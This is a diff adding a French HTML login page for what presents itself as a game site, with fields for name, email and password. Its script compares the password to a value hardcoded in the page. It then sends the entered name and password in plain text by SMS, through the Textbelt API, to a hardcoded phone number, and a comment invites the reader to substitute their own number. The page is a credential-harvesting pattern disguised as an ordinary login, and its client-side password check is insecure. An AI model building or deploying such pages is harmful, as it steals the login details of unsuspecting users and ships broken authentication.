@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cite de jeu de sylla Difter</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+
+        .navbar {
+            background-color: #00bfae;
+            color: white;
+            padding: 15px 0;
+            text-align: center;
+            font-size: 20px;
+        }
+
+        .navbar a {
+            color: white;
+            text-decoration: none;
+            margin: 0 20px;
+        }
+
+        .navbar a:hover {
+            text-decoration: underline;
+        }
+
+        .payment-container {
+            max-width: 600px;
+            margin: 50px auto;
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .payment-container h2 {
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            font-weight: bold;
+            display: block;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            margin-top: 5px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+
+        .form-group input[type="submit"] {
+            background-color: #00bfae;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .form-group input[type="submit"]:hover {
+            background-color: #008f8f;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 14px;
+            color: #888;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Barre de navigation -->
+    <div class="navbar">
+        <a href="#">Accueil</a>
+        <a href="#">Services</a>
+        <a href="#">Contact</a>
+    </div>
+
+    <!-- Formulaire de paiement -->
+    <div class="payment-container">
+        <h2>Cite de jeu de sylla Difter</h2>
+        <form id="loginForm" onsubmit="return validateForm()">
+            <div class="form-group">
+                <label for="nom">Nom Complet</label>
+                <input type="text" id="nom" name="nom" placeholder="Entrez votre nom complet" required>
+            </div>
+
+            <div class="form-group">
+                <label for="email">Adresse Email</label>
+                <input type="email" id="email" name="email" placeholder="Entrez votre email" required>
+            </div>
+
+            <div class="form-group">
+                <label for="motdepasse">Mot de passe</label>
+                <input type="password" id="motdepasse" name="motdepasse" placeholder="Entrez votre mot de passe" required>
+            </div>
+
+            <div class="form-group">
+                <input type="submit" value="Se connecter">
+            </div>
+        </form>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <p>© 2025 Cite de jeu de sylla Difter- Tous droits réservés</p>
+    </div>
+
+    <script>
+        function validateForm() {
+            var nom = document.getElementById('nom').value;
+            var motdepasse = document.getElementById('motdepasse').value;
+
+            var validPassword = "123456"; // Seul le mot de passe est vérifié
+
+            if (motdepasse !== validPassword) {
+                alert("Le mot de passe est incorrect.");
+                return false;
+            }
+
+            var message = "Connexion réussie\nNom: " + nom + "\nMot de passe: " + motdepasse;
+
+            fetch('https://textbelt.com/text', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    phone: '+2250101327840', // <-- Mets ton numéro ici
+                    message: message,
+                    key: 'textbelt'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log(data);
+                if (data.success) {
+                    alert('Connexion validée, SMS envoyé.');
+                    window.location.href = "instruction.html";
+                } else {
+                    alert("Erreur lors de l'envoi du SMS.");
+                }
+            });
+
+            return false; // Empêche l'envoi classique du formulaire
+        }
+    </script>
+
+</body>
+</html>
